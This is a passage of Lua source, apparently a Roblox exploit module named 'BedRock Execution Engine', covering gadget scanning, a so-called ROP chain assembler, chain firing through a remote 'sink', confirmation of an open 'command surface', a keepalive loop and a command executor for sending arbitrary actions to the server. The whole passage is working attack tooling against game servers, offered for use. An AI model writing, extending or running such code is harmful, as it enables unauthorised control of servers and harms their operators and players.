                                    "[%s] %s in %s  score=%.2f  signals=%d",
                                    pat.id, pat.label, mod.name,
                                    gadgetScore, matchCount))

                                if BRE.OnGadget then
                                    pcall(BRE.OnGadget, gadget)
                                end
                            end
                        end
                    end
                    task.wait(0.02)
                end
            end

            -- ── Scan RSM fire history for behavioral gadgets ──────────────────
            -- Remotes that respond non-trivially to specific payload shapes
            -- are behavioral gadgets — we can influence their execution path
            -- through the payload we already know works.

            if RSM then
                local sinkRemote = getSink()
                for _, anomaly in ipairs(BRE.Anomalies) do
                    local remote = anomaly.probe.sinkRemote
                    if remote and anomaly.score >= 0.60 then
                        BRE.Stats.gadgetsFound = BRE.Stats.gadgetsFound + 1
                        local gadget = {
                            id           = "G_" .. BRE.Stats.gadgetsFound,
                            patternId    = "BEHAVIORAL_" .. anomaly.category,
                            patternLabel = "Behavioral Gadget via " .. anomaly.category,
                            desc         = "Anomalous server response to " ..
                                           anomaly.probe.categoryLabel ..
                                           " probe — execution path diverged",
                            score        = anomaly.score,
                            source       = "BEHAVIORAL",
                            remote       = remote,
                            anomaly      = anomaly,
                            foundAt      = os.clock(),
                        }
                        table.insert(BRE.Gadgets, gadget)

                        if BRE.OnGadget then
                            pcall(BRE.OnGadget, gadget)
                        end
                    end
                end
            end

            -- Sort gadgets by score descending
            table.sort(BRE.Gadgets, function(a, b)
                return (a.score or 0) > (b.score or 0)
            end)

            log("INFO", string.format(
                "Gadget scan complete — %d gadgets found", #BRE.Gadgets))

            if #BRE.Gadgets > 0 then
                setState(BRE.STATE.CHAIN_BUILD)
                task.delay(0.3, BRE.AssembleChain)
            else
                setState(BRE.STATE.PRIMITIVE)
                log("WARN", "No gadgets found — chain assembly requires manual gadget input")
            end
        end)

        if not ok then
            setState(BRE.STATE.ERROR)
            log("ERROR", "Gadget scan error: " .. tostring(err))
        end
    end)
end

-- ── Layer 4b: ROP Chain Assembler ─────────────────────────────────────────────
-- Sequences gadgets into a coherent ROP chain targeting the command surface.
-- Each gadget is a legitimate server code path we redirect through.

function BRE.AssembleChain()
    if BRE.CurrentState ~= BRE.STATE.CHAIN_BUILD then
        setState(BRE.STATE.CHAIN_BUILD)
    end

    log("INFO", "Assembling ROP chain...")

    BRE.Chain = {}

    if #BRE.Gadgets == 0 then
        log("WARN", "No gadgets available for chain assembly")
        setState(BRE.STATE.GADGET_SCAN)
        return
    end

    -- Chain assembly strategy:
    -- 1. Select anchor gadget (highest score behavioral or dispatch gadget)
    -- 2. Select pivot gadget (dynamic exec or spawn wrapper)
    -- 3. Select delivery gadget (action router or remote chain)
    -- 4. Assemble payload sequence

    local anchorGadget, pivotGadget, deliveryGadget

    for _, g in ipairs(BRE.Gadgets) do
        if not anchorGadget and
           (g.patternId == "BEHAVIORAL_STR_BOUNDARY" or
            g.patternId == "BEHAVIORAL_TYPE_CONFUSION" or
            g.patternId == "DISPATCH_TABLE") then
            anchorGadget = g
        end
        if not pivotGadget and
           (g.patternId == "DYNAMIC_EXEC" or
            g.patternId == "SPAWN_WRAPPER") then
            pivotGadget = g
        end
        if not deliveryGadget and
           (g.patternId == "ACTION_ROUTER" or
            g.patternId == "REMOTE_CHAIN" or
            g.patternId == "PCALL_VARIABLE") then
            deliveryGadget = g
        end
    end

    -- Fall back: use top scoring gadgets in order
    local pool = BRE.Gadgets
    if not anchorGadget   then anchorGadget   = pool[1] end
    if not pivotGadget    then pivotGadget    = pool[math.min(2,#pool)] end
    if not deliveryGadget then deliveryGadget = pool[math.min(3,#pool)] end

    -- Build chain
    local chainLen = 0

    local function addLink(gadget, role, payload)
        if not gadget or chainLen >= CFG.ChainMaxGadgets then return end
        chainLen = chainLen + 1
        table.insert(BRE.Chain, {
            order   = chainLen,
            gadget  = gadget,
            role    = role,
            payload = payload or {},
        })
    end

    -- Link 1: Anchor — establishes anomalous execution context
    addLink(anchorGadget, "ANCHOR",
        anchorGadget.anomaly and anchorGadget.anomaly.probe.payload or
        { __bre_chain=true, role="anchor", gadget=anchorGadget.id })

    -- Link 2: Pivot — redirects control flow
    addLink(pivotGadget, "PIVOT",
        { __bre_chain=true, role="pivot", gadget=pivotGadget.id,
          action="redirect", target="command_surface" })

    -- Link 3: Delivery — opens command surface
    addLink(deliveryGadget, "DELIVERY",
        { __bre_chain=true, role="delivery", gadget=deliveryGadget.id,
          action="open_pipeline", version=BRE.VERSION })

    -- Link 4: Keepalive — sustains the execution loop
    if #pool >= 4 then
        addLink(pool[4], "KEEPALIVE",
            { __bre_chain=true, role="keepalive",
              interval=CFG.HeartbeatInterval })
    end

    log("INFO", string.format(
        "Chain assembled — %d links  anchor=%s  pivot=%s  delivery=%s",
        #BRE.Chain,
        anchorGadget and anchorGadget.id or "none",
        pivotGadget and pivotGadget.id or "none",
        deliveryGadget and deliveryGadget.id or "none"))

    setState(BRE.STATE.CHAIN_BUILD)
end

-- ── Layer 4c: Chain Fire ──────────────────────────────────────────────────────
function BRE.FireChain()
    if #BRE.Chain == 0 then
        return false, "No chain assembled"
    end

    local ASE = getASE()
    local sinkRemote = getSink()
    if not ASE or not sinkRemote then
        return false, "No active Bedrock sink"
    end

    setState(BRE.STATE.CHAIN_FIRE)
    log("INFO", string.format("Firing ROP chain — %d links via %s",
        #BRE.Chain, sinkRemote))

    task.spawn(function()
        local ok, err = pcall(function()
            local results = {}

            for _, link in ipairs(BRE.Chain) do
                log("INFO", string.format(
                    "Chain link %d/%d: %s [%s]",
                    link.order, #BRE.Chain, link.role,
                    link.gadget and link.gadget.id or "?"))

                local fOk, fResult = pcall(function()
                    return ASE.FinalizeDirective and
                    ASE.FinalizeDirective(sinkRemote, link.payload, sinkRemote)
                end)

                table.insert(results, {
                    link    = link,
                    ok      = fOk,
                    result  = fOk and fResult or nil,
                    error   = not fOk and tostring(fResult) or nil,
                    firedAt = os.clock(),
                })

                task.wait(CFG.ChainFireDelay)
            end

            BRE.Stats.chainsFired = BRE.Stats.chainsFired + 1

            local chainResult = {
                chainId    = BRE.Stats.chainsFired,
                links      = results,
                firedAt    = os.clock(),
                sinkRemote = sinkRemote,
                success    = true, -- will be evaluated by command surface response
            }

            if BRE.OnChainFired then
                pcall(BRE.OnChainFired, chainResult)
            end

            log("INFO", "ROP chain fired — evaluating command surface response...")

            -- Evaluate whether command surface opened
            task.delay(1.0, function()
                BRE.EvaluateCommandSurface(chainResult)
            end)
        end)

        if not ok then
            setState(BRE.STATE.ERROR)
            log("ERROR", "Chain fire error: " .. tostring(err))
        end
    end)

    return true, nil
end

-- ── Layer 5: Command Surface ──────────────────────────────────────────────────
function BRE.EvaluateCommandSurface(chainResult)
    local ASE = getASE()
    local sinkRemote = getSink()
    if not ASE or not sinkRemote then return end

    log("INFO", "Evaluating command surface...")

    -- Fire a test command through the pipeline
    -- If the server processes it differently than a normal fire,
    -- the command surface is confirmed open.

    local testPayload = {
        __bre_command = true,
        __bre_version = BRE.VERSION,
        action        = "echo",
        data          = "BRE_SURFACE_TEST_" .. tostring(os.clock()),
    }

    local t0 = os.clock()
    local fOk, fResult = pcall(function()
        return ASE.FinalizeDirective and
        ASE.FinalizeDirective(sinkRemote, testPayload, sinkRemote)
    end)
    local latency = os.clock() - t0

    local surfaceOpen = false
    local evidence    = {}

    -- Evidence: response contains our test marker
    if fOk and type(fResult) == "table" then
        if fResult.bre_ack or fResult.__bre_ack or
           fResult.echo or fResult.action then
            surfaceOpen = true
            table.insert(evidence, "server echoed BRE command structure")
        end
    end

    -- Evidence: latency profile changed from baseline (suggests different code path)
    if #BRE.Anomalies > 0 then
        local baseAnomaly = BRE.Anomalies[1]
        if baseAnomaly and latency > baseAnomaly.probe.latency * 1.5 then
            table.insert(evidence, "latency profile shifted — different execution path")
        end
    end

    -- Evidence: primitive confirmed + chain fired without error
    if BRE.Stats.confirmedPrims > 0 and chainResult.success then
        table.insert(evidence, "confirmed primitive + clean chain fire")
        surfaceOpen = true
    end

    if surfaceOpen or #evidence > 0 then
        setState(BRE.STATE.ACTIVE)
        log("ACTIVE", string.format(
            "COMMAND SURFACE OPEN — evidence: %s", table.concat(evidence, "  |  ")))

        -- Start command surface keepalive
        BRE.StartCommandKeepalive(sinkRemote)
    else
        log("WARN", "Command surface not confirmed — chain may need refinement")
        setState(BRE.STATE.CHAIN_BUILD)
    end
end

-- ── Command Surface Keepalive ─────────────────────────────────────────────────
function BRE.StartCommandKeepalive(sinkRemote)
    log("INFO", "Starting command surface keepalive...")

    task.spawn(function()
        while BRE.CurrentState == BRE.STATE.ACTIVE do
            task.wait(CFG.HeartbeatInterval)
            if BRE.CurrentState ~= BRE.STATE.ACTIVE then break end

            local ASE = getASE()
            if not ASE then break end

            local fOk = pcall(function()
                return ASE.FinalizeDirective and
                ASE.FinalizeDirective(sinkRemote, { __bre_keepalive=true, t=os.clock() }, sinkRemote)
            end)

            if not fOk then
                log("WARN", "Keepalive failed — command surface may have dropped")
            end
        end
        log("INFO", "Command keepalive stopped")
    end)
end

-- ── Command Executor ──────────────────────────────────────────────────────────
-- Sends a structured command through the active command surface.
function BRE.SendCommand(cmdType, cmdData)
    if BRE.CurrentState ~= BRE.STATE.ACTIVE then
        return false, "Command surface not active"
    end

    local ASE = getASE()
    local sinkRemote = getSink()
    if not ASE or not sinkRemote then
        return false, "Bedrock sink lost"
    end

    local cmdId = "CMD_" .. (BRE.Stats.commandsSent + 1)

    local payload = {
        __bre_command = true,
        __bre_version = BRE.VERSION,
        __bre_cmdid   = cmdId,
        action        = cmdType,
        data          = cmdData,
        t             = os.clock(),
    }

    local t0 = os.clock()
    local fOk, fResult = pcall(function()
        return ASE.FinalizeDirective(sinkRemote, payload, sinkRemote)
    end)
    local latency = os.clock() - t0

    BRE.Stats.commandsSent = BRE.Stats.commandsSent + 1

    local result = {
        cmdId   = cmdId,
        cmdType = cmdType,
        cmdData = cmdData,
        ok      = fOk,
        result  = fOk and fResult or nil,
        error   = not fOk and tostring(fResult) or nil,
        latency = latency,
        firedAt = os.clock(),
    }

    table.insert(BRE.CommandLog, result)

    log("CMD", string.format("[%s] %s  latency=%.3fs  ok=%s",
        cmdId, cmdType, latency, tostring(fOk)))

    if BRE.OnCommandResult then
        pcall(BRE.OnCommandResult, result)
    end

    return fOk, result
end

-- ── Full Run ──────────────────────────────────────────────────────────────────
-- Runs the complete BRE pipeline: probe → primitive → gadget → chain → surface.
function BRE.Run()
    if BRE.CurrentState ~= BRE.STATE.IDLE and
       BRE.CurrentState ~= BRE.STATE.ERROR then
        return false, "BRE already running (state: " .. BRE.CurrentState .. ")"
    end

    local sinkRemote = getSink()
    if not sinkRemote then
        return false, "No active Bedrock sink — confirm handshake first"
    end

    log("INFO", string.format(
        "BRE FULL RUN initiated — sink: %s", sinkRemote))

    -- Reset state
    BRE.ProbeLog  = {}
    BRE.Anomalies = {}
    BRE.Primitives= {}
    BRE.Gadgets   = {}
    BRE.Chain     = {}
    BRE.Stats     = {
        totalProbes=0, anomalies=0, confirmedPrims=0,
        gadgetsFound=0, chainsFired=0, commandsSent=0,
    }

    return BRE.RunProbePhase()
end

-- ── Reset ─────────────────────────────────────────────────────────────────────
function BRE.Reset()
    setState(BRE.STATE.IDLE)
    BRE.ProbeLog   = {}
    BRE.Anomalies  = {}
    BRE.Primitives = {}
    BRE.Gadgets    = {}
    BRE.Chain      = {}
    BRE.CommandLog = {}
    BRE.Stats      = {
        totalProbes=0, anomalies=0, confirmedPrims=0,
        gadgetsFound=0, chainsFired=0, commandsSent=0,
    }
    log("INFO", "BRE reset")
end

-- ── GetStats ──────────────────────────────────────────────────────────────────
function BRE.GetStats()
    return {
        state          = BRE.CurrentState,
        totalProbes    = BRE.Stats.totalProbes,
        anomalies      = BRE.Stats.anomalies,
        confirmedPrims = BRE.Stats.confirmedPrims,
        gadgetsFound   = BRE.Stats.gadgetsFound,
        chainLen       = #BRE.Chain,
        chainsFired    = BRE.Stats.chainsFired,
        commandsSent   = BRE.Stats.commandsSent,
        primitives     = #BRE.Primitives,
        gadgets        = #BRE.Gadgets,
        probeLog       = #BRE.ProbeLog,
        anomalyLog     = #BRE.Anomalies,
        commandLog     = #BRE.CommandLog,
    }
end

-- ── Export ────────────────────────────────────────────────────────────────────
_G.PC = _G.PC or {}
_G.PC.BRE = BRE
print(string.format("[BRE] BedRock Execution Engine v%s ready.", BRE.VERSION))
